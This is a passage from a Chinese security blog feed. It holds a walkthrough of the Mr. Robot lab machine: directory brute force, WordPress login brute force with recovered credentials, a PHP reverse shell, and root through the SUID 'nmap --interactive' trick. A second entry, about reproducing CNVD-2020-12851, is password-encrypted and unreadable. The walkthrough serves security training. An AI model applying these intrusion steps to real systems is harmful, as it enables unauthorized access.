      <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><pre><code>Kali:192.168.1.110mr.Robot:192.168.1.106</code></pre><p>开局nmap<br><img src="https://s2.ax1x.com/2020/03/02/3RW8UA.png" alt=""></p><p>web打开一看，网页终端<br><img src="https://s2.ax1x.com/2020/03/02/3RWDEj.png" alt=""></p><p>帮助命令给你放视频…<br><img src="https://s2.ax1x.com/2020/03/02/3RW6Cq.png" alt=""></p><p>gobuster跑目录</p><pre><code>gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://192.168.1.106 -t 30</code></pre><p><img src="https://s2.ax1x.com/2020/03/02/3RW7P1.png" alt=""></p><p>robots.txt<br><img src="https://s2.ax1x.com/2020/03/02/3RfAsS.png" alt=""></p><p>fsocity.dic是一堆单词<br><img src="https://s2.ax1x.com/2020/03/02/3RhgnU.png" alt=""></p><p><img src="https://s2.ax1x.com/2020/03/02/3Rh0ts.png" alt=""></p><p>通过上面得知是WordPress，wpscan跑，没扫出什么洞<br><img src="https://s2.ax1x.com/2020/03/02/3Rf4Qf.png" alt=""></p><p>枚举用户也没结果<br><img src="https://s2.ax1x.com/2020/03/02/3Rh0ts.png" alt=""></p><p>去wp-login试了下admin,用户不存在<br><img src="https://s2.ax1x.com/2020/03/02/3R4Uv6.png" alt=""></p><p>那么得先跑用户，burp一把梭<br><img src="https://s2.ax1x.com/2020/03/02/3RI0tH.png" alt=""></p><p>得到用户</p><pre><code>Elliot</code></pre><p>拿相同的字典撞密码，最终得到的密码是（漫长的等待）</p><pre><code>ER28-0652</code></pre><p>登进去发现是admin权限的用户<br><img src="https://s2.ax1x.com/2020/03/02/3RT5yq.png" alt=""></p><p>然后getshell（用的php-reverse-tcp）<br><img src="https://s2.ax1x.com/2020/03/02/3RTx61.png" alt=""></p><p>nc监听，访问拿到shell<br><img src="https://s2.ax1x.com/2020/03/02/3R7r9J.png" alt=""></p><p>查看用户目录下有啥<br><img src="https://s2.ax1x.com/2020/03/02/3RbQzj.png" alt=""></p><p>进入了这个用户的目录，发现个有趣的文件<br><img src="https://s2.ax1x.com/2020/03/02/3RqLHx.png" alt=""></p><p>貌似是robot的hash，md5查一下<br><img src="https://s2.ax1x.com/2020/03/02/3ROkQJ.png" alt=""></p><p>su切换用户<br><img src="https://s2.ax1x.com/2020/03/02/3RO701.png" alt=""></p><p>提权SUID位发现nmap，版本低于5.x使用</p><pre><code>nmap --interactive</code></pre><p><img src="https://s2.ax1x.com/2020/03/02/3Rj7i6.png" alt=""></p><p>到root目录拿key完事<br><img src="https://s2.ax1x.com/2020/03/02/3Rv0SO.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CNVD-2020-12851复现</title>
      <link href="/posts/10f63727.html"/>
      <url>/posts/10f63727.html</url>
      <content type="html"><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Please enter the password to read the blog." />    <label for="pass">Please enter the password to read the blog.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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